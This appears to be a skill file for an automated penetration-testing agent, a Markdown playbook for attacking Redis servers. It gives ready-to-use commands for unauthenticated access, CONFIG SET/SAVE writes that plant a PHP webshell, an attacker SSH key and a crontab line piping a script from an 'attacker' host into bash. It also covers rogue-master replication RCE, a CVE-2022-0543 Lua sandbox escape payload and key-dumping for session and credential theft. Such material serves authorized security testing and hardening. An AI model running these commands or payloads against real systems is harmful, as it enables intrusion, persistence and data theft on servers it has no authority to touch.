---
name: redis
description: Redis security testing covering unauthenticated access, CONFIG SET file-write primitives, MODULE LOAD and replication-based RCE, Lua sandbox boundaries, and version-dependent protection defaults
---

# Redis

Redis is an in-memory data store frequently deployed with no authentication and broad network exposure — its command set includes file-write primitives (`CONFIG SET dir/dbfilename` + `SAVE`), code-loading (`MODULE LOAD`), and replication control (`REPLICAOF`) that convert data-store access into OS-level compromise. This skill owns Redis-specific exploitation once the service is reached: unauthenticated access, file-write abuse, module/replication RCE, Lua sandbox boundaries, ACL bypass, and RDB/AOF data extraction. SSRF-to-Redis reach via `gopher://` is owned by `ssrf` (and the gopher payload construction by `rce`); this skill owns what to do with the Redis commands once the channel is open. Credential brute-force mechanics route to `weak_password_detection`.

## Attack Surface

- **Default port:** 6379 (TCP), 16379 (cluster bus), 26379 (Sentinel)
- **Protocol:** RESP (Redis Serialization Protocol) — line-oriented, plaintext by default, trivially constructed in `gopher://` URLs
- **Authentication:** none by default on all versions; `requirepass` is a single shared password when configured; ACL system (Redis 6+) adds per-user auth but ships with `user default on nopass ~* &* +@all`
- **Protected mode:** since Redis 3.2, blocks remote connections when no auth is set AND Redis is bound to `0.0.0.0` — but containers bind to all interfaces by design, and protected mode does not engage when the connection is local (e.g. SSRF)
- **Dangerous commands:** `CONFIG`, `DEBUG`, `MODULE`, `REPLICAOF`/`SLAVEOF`, `CLUSTER`, `EVAL`/`EVALSHA`, `SCRIPT`, `SAVE`/`BGSAVE`, `FLUSHALL`/`FLUSHDB`, `SHUTDOWN`
- **Data exposure:** cached sessions, tokens, credentials, rate-limit state, job queues (Celery, Sidekiq, Bull), application-specific keys

## Reconnaissance

**Fingerprinting** (unauthenticated)
```
# Banner probe — a raw PING to 6379
redis-cli -h <target> PING           # PONG = no auth
redis-cli -h <target> INFO server    # redis_version, os, tcp_port, uptime

# Nmap script
nmap -sV -p 6379 --script redis-info <target>

# If auth required:
redis-cli -h <target> PING           # -NOAUTH Authentication required.
```

Measured on Redis 7.4.11 (Docker `redis:7`): `PING` returns `PONG`, `INFO server` returns full server metadata (version, OS, PID, bind address, uptime) — no authentication required. ACL default: `user default on nopass ~* &* +@all`.

**Version-dependent defaults** (critical for scoping the attack)

| Feature | Redis ≤6.x | Redis 7.x (default) |
|---|---|---|
| Authentication | None | None |
| `CONFIG SET dir/dbfilename` | Available | **Blocked** (`enable-protected-configs no`) |
| `MODULE LOAD` | Available | **Blocked** (`enable-module-command no`) |
| `DEBUG` | Available | **Blocked** (`enable-debug-command no`) |
| `REPLICAOF` | Available | Available |
| `EVAL` Lua sandbox | Same | Same |

Measured: Redis 7 introduced `enable-protected-configs`, `enable-module-command`, and `enable-debug-command` — all default to `no` (blocked). Redis 6 has none of these protections. Determine the version before selecting the attack path.

## Key Vulnerabilities

### Unauthenticated Access (All Versions)

Redis ships with no authentication. Measured on Redis 7.4.11: every command except `CONFIG SET dir/dbfilename`, `MODULE LOAD`, and `DEBUG` executes without credentials. The default ACL user is `nopass` with `+@all` (all commands permitted). An unauthenticated attacker can read every key (`KEYS *`, `GET`, `HGETALL`, `LRANGE`), write arbitrary data, and invoke dangerous commands (version-dependent).

### CONFIG SET dir/dbfilename + SAVE (File Write)

The classic Redis-to-RCE primitive: redirect the RDB dump to a controlled path with a payload embedded in a key value.

```
# Webshell (Redis running as www-data, writable webroot)
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload '<?php system($_GET["cmd"]); ?>'
SAVE

# SSH authorized_keys (Redis running as root or target user)
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET payload '\n\nssh-rsa AAAA...attacker-key\n\n'
SAVE

# Crontab (Redis running as root, Linux)
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET payload '\n* * * * * curl http://attacker/shell.sh | bash\n'
SAVE
```

Measured: on Redis 6.2.24, all three `CONFIG SET` paths succeed. On Redis 7.4.11 (default config), `CONFIG SET dir` returns `ERR CONFIG SET failed - can't set protected config`. With `--enable-protected-configs yes`, the commands succeed — so the protection is a runtime flag, not a hard removal. Operators who explicitly enable it (or who run Redis ≤6) remain fully vulnerable.

### MODULE LOAD RCE

Redis 4.0+ supports loadable shared-object modules. `MODULE LOAD /path/to/malicious.so` executes arbitrary native code in the Redis process. Requires the module file on disk — combine with a file-upload primitive, or with replication-based delivery (below).

Measured: Redis 7 blocks `MODULE LOAD` by default (`enable-module-command no`); Redis 6 accepts it.

### Replication-Based RCE (SLAVEOF / REPLICAOF)

An unauthenticated attacker points the Redis instance at a malicious master (`REPLICAOF attacker-ip 6379`). The attacker's fake master serves a Redis module (`.so`) via the replication full-sync protocol. After sync, `MODULE LOAD` on the delivered file achieves RCE. Tools: `redis-rogue-server`.

Measured: `REPLICAOF NO ONE` returns `OK` on both Redis 6 and 7 — the command is available regardless of version. On Redis 7 with `enable-module-command no`, the replication sync delivers the file but `MODULE LOAD` is blocked, preventing the final step. On Redis 6 or Redis 7 with `enable-module-command yes`, the full chain works.

### Lua Sandbox (EVAL)

Redis embeds a Lua interpreter for server-side scripting (`EVAL`). The sandbox strips `os.execute`, `io.open`, `loadfile`, `dofile`, and `require`. Measured on Redis 7.4.11: `os.execute('id')` → `attempt to call field 'execute' (a nil value)`; `io.open` → `nonexistent global variable 'io'`; `loadfile` → blocked. The `os` table exists (`rawget(_G,'os')` returns a table) but all dangerous functions are nil.

### CVE-2022-0543 — Debian/Ubuntu Lua Sandbox Escape (CVSS 10.0)

Debian-packaged Redis linked Lua dynamically instead of statically, leaving the `package` table accessible. An attacker could load arbitrary Lua modules via `package.loadlib` → `os.execute` → RCE. Affected Debian/Ubuntu-packaged Redis (not upstream or Docker official images). Fixed in Debian security updates.

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id"); local res = f:read("*a"); f:close(); return res' 0
```

### CVE-2024-31449 — Lua Bit Library Stack Overflow (CVSS 7.0)

Stack buffer overflow in the Lua bit library in Redis < 7.2.6 and < 7.4.1. A crafted Lua script triggers the overflow → potential RCE. Requires authenticated access or the ability to execute `EVAL`.

### CVE-2023-41056 — Heap Overflow via Memory Resizing (CVSS 8.1)

Integer overflow in internal memory buffer resizing in Redis < 7.0.15 and < 7.2.4 → heap corruption → potential RCE.

### SSRF → Redis via gopher://

The classic SSRF-to-Redis chain: a server-side request forgery that honors the `gopher://` scheme sends raw RESP commands to an internal Redis. The SSRF reach is owned by `ssrf`; the Redis-side payloads (CONFIG SET writes, MODULE LOAD, data exfil) are this skill's surface. See `rce` for gopher payload construction.

## Testing Methodology

1. **Probe port 6379** — `redis-cli PING`; if `PONG`, no auth. If `-NOAUTH`, test common passwords and move to brute-force.
2. **Version** — `INFO server` → `redis_version`. Determines which protections apply (v7 blocks CONFIG/MODULE/DEBUG; v6 does not).
3. **Data inventory** — `KEYS *` (or `SCAN 0 COUNT 100` for large keystores); `TYPE` + `GET`/`HGETALL`/`LRANGE` on interesting keys. Look for session tokens, credentials, API keys, rate-limit state, job queue payloads.
4. **CONFIG SET test** — `CONFIG SET dir /tmp` + `CONFIG SET dbfilename test.rdb`. If it succeeds, the file-write primitive is live; try webshell, SSH key, or crontab paths.
5. **MODULE LOAD test** — `MODULE LOAD /nonexistent.so`. If the error is "No such file" (not "command not allowed"), module loading is enabled.
6. **Replication test** — `INFO replication` to check current role; `REPLICAOF` availability.
7. **Lua probing** — `EVAL "return redis.call('INFO','server')" 0` to confirm EVAL works; test sandbox boundaries if the Debian/Ubuntu packaging applies.
8. **ACL audit** — `ACL LIST`, `ACL GETUSER default`; check for non-default users with weak passwords or over-scoped commands.

## Validation

1. Show `PING → PONG` or `INFO server` output proving unauthenticated access with the Redis version visible.
2. For CONFIG SET file write: show the `CONFIG SET` commands succeeding, the `SAVE` confirmation, and the written file's contents (e.g. `cat /var/www/html/shell.php` showing the payload embedded in RDB binary).
3. For MODULE LOAD or replication RCE: show command execution output (e.g. `id`, `whoami`) from the loaded module.
4. For data theft: show the recovered sensitive data (session tokens, credentials) with key names.
5. For SSRF-to-Redis: show the gopher URL, the SSRF response, and the Redis-side effect (written file, exfilled data).

## False Positives

- **Protected mode blocking remote connections** — Redis 3.2+ blocks remote unauth when bound to all interfaces; test from the same network segment or via SSRF, not from the internet through a firewall that drops 6379.
- **Redis 7 with default protections** — CONFIG SET dir/dbfilename is blocked; the file-write primitive does not apply unless `enable-protected-configs yes` is set. Report the unauthenticated data-access finding, not the file-write RCE.
- **Managed Redis services** (AWS ElastiCache, Azure Cache, GCP Memorystore) — CONFIG, MODULE, REPLICAOF are disabled server-side. The attack surface is limited to data access with stolen credentials and misconfigured security groups.
- **Redis behind an application proxy** — some applications proxy a subset of Redis commands; confirm you are reaching Redis directly, not a filtered interface.
- **CVE-2022-0543 on non-Debian packaging** — the Lua sandbox escape applies only to Debian/Ubuntu-packaged Redis with dynamically linked Lua. Docker official images and source-compiled Redis are not affected.

## Impact

- Arbitrary file write → webshell, SSH key injection, crontab persistence → OS-level RCE.
- Data theft: cached sessions, tokens, credentials, API keys, job queue contents.
- Replication-based RCE via malicious master → full process compromise.
- Lateral movement: Redis credentials and data reused across services; session tokens replayed.
- Denial of service: `FLUSHALL` wipes all data; `SHUTDOWN` stops the service.

## Pro Tips

1. Always check the version first — Redis 7 blocks the classic attack (CONFIG SET + SAVE) by default; Redis 6 does not.
2. `KEYS *` on a production Redis can be slow and block the event loop — use `SCAN` with a reasonable `COUNT` instead.
3. The gopher-to-Redis SSRF chain remains one of the highest-value SSRF payloads; an internal Redis with no auth is almost always present in containerized environments.
4. Redis Cluster mode splits data across shards — `KEYS *` only returns keys on the connected node; use `redis-cli --cluster call` or connect to each node.
5. Pair with `ssrf` for gopher:// reach, `rce` for gopher payload construction, `weak_password_detection` for credential brute-force, and `nosql_injection` for injection into application-layer Redis queries.

## Summary

Redis ships with no authentication on all versions. Redis 6 and earlier expose the full CONFIG SET + SAVE file-write primitive and MODULE LOAD for direct RCE. Redis 7 blocks these by default but leaves every other command — including data access, replication control, and Lua scripting — open to unauthenticated connections. The replication-based RCE chain (REPLICAOF → malicious master → module delivery) remains available across versions. An exposed Redis is never just a data-access finding — determine the version, test the write and module primitives, inventory the data, and chain to OS compromise where the protections allow it.
